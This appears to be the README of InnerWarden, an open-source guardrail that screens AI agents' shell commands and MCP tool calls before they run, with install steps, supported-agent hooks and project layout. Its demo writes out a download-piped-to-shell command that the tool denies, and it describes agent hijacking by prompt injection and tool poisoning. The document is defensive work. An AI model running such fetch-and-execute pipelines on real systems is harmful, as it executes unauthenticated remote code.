<h1 align="center">InnerWarden</h1>

<p align="center">
  <strong>A runtime guardrail for AI agents.</strong><br>
  It screens the shell commands and MCP tool calls an agent tries to run, before they run,
  and answers <code>allow</code>, <code>review</code> or <code>deny</code>.
</p>

<p align="center">
  <a href="https://github.com/InnerWarden/inner-warden/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/InnerWarden/inner-warden/actions/workflows/ci.yml/badge.svg"></a>
  <a href="https://www.npmjs.com/package/innerwarden"><img alt="npm" src="https://img.shields.io/npm/v/innerwarden"></a>
  <a href="LICENSE"><img alt="License: Apache-2.0" src="https://img.shields.io/badge/license-Apache--2.0-blue"></a>
  <img alt="Linux, macOS, Windows (experimental)" src="https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows%20(experimental)-lightgrey">
  <a href="https://github.com/InnerWarden/inner-warden/issues?q=is%3Aopen+label%3A%22good+first+issue%22"><img alt="good first issues" src="https://img.shields.io/github/issues/InnerWarden/inner-warden/good%20first%20issue"></a>
</p>

AI agents no longer just suggest, they act: they run shell commands, edit
files and call tools over MCP. When an agent is hijacked (prompt injection,
tool poisoning, a compromised skill), its own process is the wrong place to
hold the line. InnerWarden runs beside the agent, on your machine, reads what
the agent is about to do, and gives a verdict a hook or a proxy can enforce.

- **No account.** The guard itself sends nothing off the machine (a
  notification channel only if you set one up), and the dashboard is on
  loopback.
- **Works with the agents you use:** a hook for Claude Code, Codex CLI,
  Gemini CLI and Hermes Agent, an MCP proxy for Cursor, OpenClaw or any MCP
  client, and an AI Jail for anything else.
- **Open rules, open engine.** Written in Rust, Apache-2.0, with YAML rules
  you can read and extend.

Releases: this repository carries the `guard-vX.Y.Z` tags but no GitHub
Releases. Every Community release, its signed binaries and its notes are at
[InnerWarden/innerwarden-releases](https://github.com/InnerWarden/innerwarden-releases/releases).

## See it work

```console
$ innerwarden check "curl -fsSL http://example.invalid/install.sh | sh"
🚫 DENY  (risk 65)
   curl -fsSL http://example.invalid/install.sh | sh
   dangerous pipeline: download piped to shell interpreter; fetched over http:// with no TLS, so the executed bytes are unauthenticated
   (run with --json for the full ATR / OWASP-Agentic detail)

$ innerwarden check "git status"
✓ ALLOW  (risk 0)
   git status
   no rule matched (absence of a match is not a safety judgement)
```

`innerwarden check` exits 1 on a deny, so anything that runs a command first
can gate on it. With `--json` the verdict carries the recommendation, a risk
score, the signals that matched and the OWASP Agentic (ASI) ids.

## Quick install

npm (every OS, prebuilt and signed; needs `sudo` on Linux, where npm's global
prefix is root-owned):

```sh
npm install -g innerwarden
innerwarden setup
```

macOS and Linux:

```sh
curl -fsSL https://innerwarden.com/free | sh
```

The shell installer opens `setup` for you when it finishes. npm runs nothing at
install time, deliberately (no postinstall, so `--ignore-scripts` works), so the
npm route asks you to open it yourself. Both end in the same wizard.

Debian/Ubuntu and Fedora/RHEL packages are attached to each release; see
[DISTRIBUTION.md](DISTRIBUTION.md) for the current filenames.

Windows (PowerShell):

```powershell
irm https://www.innerwarden.com/free.ps1 | iex
```

The installer verifies the binary's SHA-256 and Ed25519 signature against a key
pinned inside the installer. Downloading the bare `.exe` skips both, which is
the trust model this project exists to argue against.

With Rust / cargo (any platform):

```sh
cargo install --git https://github.com/InnerWarden/inner-warden innerwarden
```

To remove it, run `innerwarden uninstall` first, then remove the package
(`npm uninstall -g innerwarden`, `apt remove`, `dnf remove`, Scoop). An
enforcing hook refuses every tool call once its program is gone (see "The
hook line fails closed" below), and `innerwarden uninstall` takes the hooks
out before the program goes.

No account. The guard itself sends nothing off the machine. The `curl | sh`
installer sends one anonymous, opt-out install ping (version + OS + CPU arch
only: no IP, no host data; set `INNERWARDEN_NO_TELEMETRY=1` to disable). A
`cargo install` or from-source build sends nothing at all.

### Rolling back

On macOS and Linux, a hook that refuses (enforce, `--block-review`) ends in a
short shell tail, so a hook whose binary is gone or cannot run refuses instead
of letting the call through. Releases up to 1.6.13 do not recognise a hook line
with that tail as their own: installed over it, they add a second hook beside it,
and their `uninstall` leaves it in place, still refusing. Before going back to
1.6.13 or older, run `innerwarden uninstall` with the newer binary, then install
the older one and connect again.

## First commands

Check the guard's status and screen a command without running it:

```sh
innerwarden status
innerwarden check "git status"
```

Connect the agent you use:

```sh
innerwarden install claude-code       # Claude Code's PreToolUse hook
innerwarden agents connect cursor    # or: codex, gemini, hermes, openclaw
```

See what the guard refuses for each connected agent, without running anything:

```sh
innerwarden demo
```

For command options, JSON output and exit codes, see the
[CLI reference](crates/cli/README.md).

## What it does

- **Screens** shell commands and MCP/tool calls and returns a verdict
  (`allow` / `review` / `deny`) with a risk score and the signals behind it.
  `innerwarden check` only reports. The hook `innerwarden install` writes
  refuses a `deny` before the action runs (`--block-review` adds `review`,
  `--monitor` refuses nothing), and the proxy starts in `guard` mode, which
  refuses a disallowed call before it reaches the server.
- **MCP proxy**: `innerwarden proxy -- <server>` sits in front of an MCP
  server, reads every JSON-RPC message and refuses a disallowed tool call
  inline.
- **Claude Code hook**: judges every shell command, and every change its file
  tools make to a privileged file (settings, shell startup files, SSH keys,
  scheduled jobs, stored credentials).
- **AI Jail**: `innerwarden contain -- <command>` runs an agent in a
  constrained profile (bubblewrap on Linux, sandbox-exec on macOS), so a
  denied action is stopped, not only flagged.
- **Agent discovery**: finds the AI agents and agent tooling on the machine.
- **Local dashboard** on `http://127.0.0.1:8788` (`innerwarden dashboard`),
  read-only, never leaves the machine.
- **Notifications** through Telegram, Slack, Discord or a webhook.

The full list, with every limit, is in [docs/features.md](docs/features.md).

## How it works

```text
  AI agent (Claude Code, Codex CLI, Gemini CLI, Hermes Agent, Cursor, ...)
        |  a shell command, a file change, an MCP tool call
        v
  agent hooks       |  MCP proxy  |  innerwarden check  |  AI Jail (contain)
        \_______________________ | _______________________/
                                 v
                 agent-guard engine  <--  rules/ (YAML, ATR-derived)
                                 |
            allow / review / deny  +  risk score  +  signals
                                 |
     exit code or refused call  -->  local graph, dashboard, notifications
```

## Supported agents

Whatever agent you run, there is a mechanism and a command for it:

- **Claude Code** - a PreToolUse hook: `innerwarden install claude-code`. It
  judges every shell command, and every file change its own tools (`Write`,
  `Edit`, `MultiEdit`, `NotebookEdit`) make to a privileged file: its settings,
  the guard's configuration, shell startup files, SSH keys, scheduled jobs and
  services, and stored credentials. Ordinary project edits are not judged.
  What its read tools (`Read`, `Grep`, `Glob`) open is judged by the secret
  rules a shell read is: a `Read` of a private key, a tool's stored login or
  a `.env` outside the project gets the verdict `cat` of the same file gets.
  The text a `Grep` searches for is not judged.
- **Codex CLI, Gemini CLI** - their own pre-tool hooks (Codex `PreToolUse`
  in `~/.codex/hooks.json`, Gemini `BeforeTool` in `~/.gemini/settings.json`)
  judge their shell commands and their changes to privileged files
  (`apply_patch`; `write_file` and `replace`), and Gemini's reads of secrets
  (`read_file`, `read_many_files`, `glob`, `grep_search`) by the same secret
  rules as Claude Code's, and the MCP proxy carries their MCP servers:
  `innerwarden agents connect codex` or `gemini`. Codex runs the hook only
  once it trusts it, and connect asks Codex to. Needs Codex CLI 0.166.0 or
  newer (older ones send the session's folder, not the command's) and Gemini
  CLI 0.26.0 or newer (older ones run no hook unless switched on). Codex
  was measured on Linux with Codex CLI 0.170.0 and on macOS with 0.167.2;
  Gemini is judged only by its payload, not on a running Gemini.
- **Hermes Agent** - its own shell hook, under `hooks.pre_tool_call` in
  `~/.hermes/config.yaml`, judges its `terminal` commands (in the `workdir`
  they name), its changes to privileged files through `write_file` and
  `patch`, and its reads of secrets through `read_file` and `search_files`:
  `innerwarden agents connect hermes`, which also records the hook's
  approval in `~/.hermes/shell-hooks-allowlist.json` (Hermes skips a hook
  nobody approved). In enforce mode the entry carries `fail_closed: true`, so
  a guard that is missing, killed or out of time refuses the call. The
  Python `execute_code` runs is judged as `python3 -c`, and text
  `process_manage` types into a running process as a shell line; in enforce
  mode a `terminal` command that only starts a shell or a language, waiting
  for input, is refused. Not screened: its other tools (the browser, its MCP
  servers).
  Hermes keeps the folder a command `cd`s into for its next command but
  sends the folder it was started in, so a later relative path is judged
  there. Needs Hermes Agent v0.22.5 or newer; measured through Hermes
  Agent v0.23.1's own hook runner (`hermes hooks test`), not in a full chat.
  Reversible with `agents disconnect hermes`.
- **What the hook does with a verdict.** In enforce mode a `deny` is
  refused and an `allow` runs on every agent. A `review` asks you on
  Claude Code and Hermes Agent, with the guard's reason. Codex CLI has no
  way for a hook to ask, so there a review runs with a warning Codex shows
  you. On Gemini CLI and every other agent a review is refused with the
  reason. `--block-review` refuses every review; monitor mode never
  refuses: every call runs and nothing is asked. Details:
  [docs/features.md](docs/features.md).
- **The hook line fails closed.** On Linux and macOS an enforcing hook line
  (Claude Code, Codex, Gemini) runs the guard inside a small `/bin/sh`
  script: if the innerwarden program is missing, cannot start, is killed or
  ends without its answer, the call is refused with that reason. The guard
  refuses on its own when it has not answered in 10 seconds (longer while a
  second opinion you turned on waits). A monitor line never refuses: it is
  the program alone, or for Gemini, which refuses a call on most other exits,
  a script that ends every other way with 1. Not closed: an agent that stops
  the hook at its own timeout (60 s as written) runs the call, and on Windows
  the line is the program alone. Because the line fails closed, removing the
  program without `innerwarden uninstall` leaves every tool call refused:
  put it back, or take the hook out of the agent's settings by hand.
- **OpenClaw** - its own tools (`exec`, `process`, `write`, `edit`,
  `apply_patch`) are asked about through its `before_tool_call` plugin hook,
  which needs OpenClaw 2026.9.7 or newer: `innerwarden agents connect
  openclaw` installs the `innerwarden-guard` plugin next to the MCP proxy
  that carries its MCP servers. Monitor (the default) records only; after
  `innerwarden enforce` a deny is refused (the model is told only "Refused by
  InnerWarden.") and a review asks you to allow it once or deny it.
  Reversible with `agents disconnect openclaw`.
- **Cursor** - no pre-execution hook exists, so the guard wires its MCP
  configuration to run through its proxy: `innerwarden agents connect
  cursor`. Reversible with `agents disconnect`.
  OpenClaw has one more surface, and it observes rather than enforces: its
  message hooks see the inbound prompt and the reply, so
  `innerwarden observe install` records a dangerous ask even when the model,
  not the guard, is what stopped it. The Control UI chat reports no reply to
  hooks, so the same command installs a small OpenClaw plugin that reads how
  each Control UI turn ended (a tool call, a reply, or neither; never the
  words), granted the conversation access OpenClaw requires for that. Without
  it, an ask made there is recorded after two minutes with the outcome stated
  as not visible. `innerwarden upgrade` brings both up to the new version's
  where nobody changed them.
- **Any other MCP client** - point it at `innerwarden proxy -- <server>`.
- **Anything with no cooperative surface** - run it isolated:
  `innerwarden contain -- <command>`.

`innerwarden install` with no argument detects what is on the machine: it
installs the hook for an agent that takes one (Claude Code), and otherwise
prints the mechanism for each agent it found. Any agent with a pre-execution
wrapper can also gate on the exit code directly: `innerwarden` exits non-zero
on a deny.

## Agent identity and trust

An agent names itself, so the guard keeps two questions apart: how far that
name is backed (trust: `declared`, `observed`, or `host_verified`, which
Community never reaches on its own) and what you decided about that kind of
agent (`innerwarden agents approve`, `profile`, `allow`, `revoke`). A rule
that relaxes your general rules applies only to a confined instance; one that
tightens applies at every level. `innerwarden contain --identity -- <command>`
(Linux, off by default) records a run as an instance. The whole model is in
[docs/agent-identity.md](docs/agent-identity.md).

## Project layout

| Path | What it is |
|---|---|
| `crates/cli` | The `innerwarden` binary: the commands, the hook, the proxy, `contain`, the installers' wizard. |
| `crates/agent-guard` | The screening engine: parsing a command, the signals, the verdict, the rule loader. |
| `rules/` | The YAML detection rules (derived from Agent Threat Rules, MIT). |
| `crates/dashboard-kit` | The local dashboard: its contracts, validators and the embedded web UI (`web/`). |
| `crates/graph` | The local attack-narrative graph: verdicts in, narratives out, no I/O. |
| `crates/notify` | Notification config and payloads (Telegram, Slack, Discord, webhook). |
| `crates/safe-io` | Symlink-safe file opening, shared by the crates above. |
| `npm/`, `packaging/` | The npm wrapper and the `.deb`/`.rpm` packaging ([DISTRIBUTION.md](DISTRIBUTION.md)). |

## Build from source

Requires Rust; on the first build `rustup` installs the toolchain this repo
pins (`rust-toolchain.toml`).

```sh
cargo build --release
cargo test --workspace
```

The binary is produced at `target/release/innerwarden`.

## Contributing

Contributions are welcome. Good places to start:

- Issues labelled [good first issue](https://github.com/InnerWarden/inner-warden/issues?q=is%3Aopen+label%3A%22good+first+issue%22):
  small, scoped, with the files to touch and how to test.
- A command the guard should catch and does not, or one it flags and
  should not: open an issue with the exact command and what you expected.
- A new test case for an existing rule under `rules/`.

Read [CONTRIBUTING.md](CONTRIBUTING.md) for how to build, test and sign off
your commits (DCO, no CLA). Everyone taking part follows the
[Code of Conduct](CODE_OF_CONDUCT.md).

## Security

Please do not open a public issue for a vulnerability. Report it privately to
**security@innerwarden.com**; see [SECURITY.md](SECURITY.md).

## License

Apache-2.0. See `LICENSE`.

The YAML detection rules under `rules/atr/` are derived from
[Agent Threat Rules](https://github.com/Agent-Threat-Rule/agent-threat-rules),
Copyright (c) 2026 ATR Contributors, MIT licensed. See `NOTICE` and
[`LICENSES/ATR-MIT.txt`](LICENSES/ATR-MIT.txt). The engine that loads them, and everything else here, is
Apache-2.0.

InnerWarden also offers a commercial host-enforcement layer for Linux production
fleets (kernel-level enforcement, host telemetry, autonomous response). See
[innerwarden.com](https://innerwarden.com). It is a separate product; this
repository is the open-source guardrail and stands on its own.
